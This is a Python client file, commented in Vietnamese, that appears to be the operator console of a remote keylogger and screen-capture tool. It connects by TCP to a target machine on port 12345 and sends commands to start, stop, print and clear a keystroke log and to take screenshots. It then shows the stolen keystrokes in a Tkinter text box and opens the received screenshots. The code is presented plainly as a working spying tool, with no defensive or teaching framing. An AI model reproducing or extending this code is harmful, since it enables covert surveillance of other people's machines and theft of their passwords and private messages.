import socket
import tkinter as tk
from PIL import Image
from io import BytesIO

class Client:
    def __init__(self):
        self.server_ip = ""
        self.socket = None
        self.keylog_text = None

    def connect_to_server(self, server_ip):
        self.server_ip = server_ip
        try:
            # Kết nối tới server
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, 12345))
            print("Đã kết nối tới server.")
        except ConnectionRefusedError:
            print("Không thể kết nối tới server.")

    def send_message(self, message):
        if not self.socket:
            print("Chưa kết nối tới server.")
            return
        try:
            # Gửi tin nhắn tới server
            self.socket.sendall(message.encode())
            print("Đã gửi tin nhắn.")
        except OSError:
            print("Gửi tin nhắn không thành công.")

    def disconnect_from_server(self):
        if not self.socket:
            print("Chưa kết nối tới server.")
            return
        # Ngắt kết nối với server
        self.socket.close()
        print("Đã ngắt kết nối với server.")

    def start_keylogger(self):
        self.send_message("start")

    def stop_keylogger(self):
        self.send_message("stop")

    def print_keylog(self):
        self.send_message("print")
        response = self.socket.recv(1024).decode()  # Đọc dữ liệu từ server
        print(response)
        if response:
            self.keylog_text.delete(1.0, tk.END)  # Xóa bất kỳ dữ liệu cũ nào trong ô text
            self.keylog_text.insert(tk.END, response)  # Hiển thị dữ liệu keylog trong ô text
    
    def clear_keylog(self):
        self.send_message("clear")
    
    def request_screenshot(self):
        self.send_message("screenshot")

    def receive_screenshot(self):
        try:
            screenshot_size = int(self.socket.recv(1024))
            screenshot_data = b""
            while screenshot_size > 0:
                chunk = self.socket.recv(4096)
                screenshot_data += chunk
                screenshot_size -= len(chunk)
            return screenshot_data
        except Exception as e:
            print(f"Lỗi khi nhận hình ảnh màn hình: {str(e)}")
            return None

    def display_screenshot(self):
        screenshot_data = self.receive_screenshot()
        if screenshot_data:
            try:
                image = Image.open(BytesIO(screenshot_data))
                image.show()
            except Exception as e:
                print(f"Lỗi khi hiển thị hình ảnh: {str(e)}")
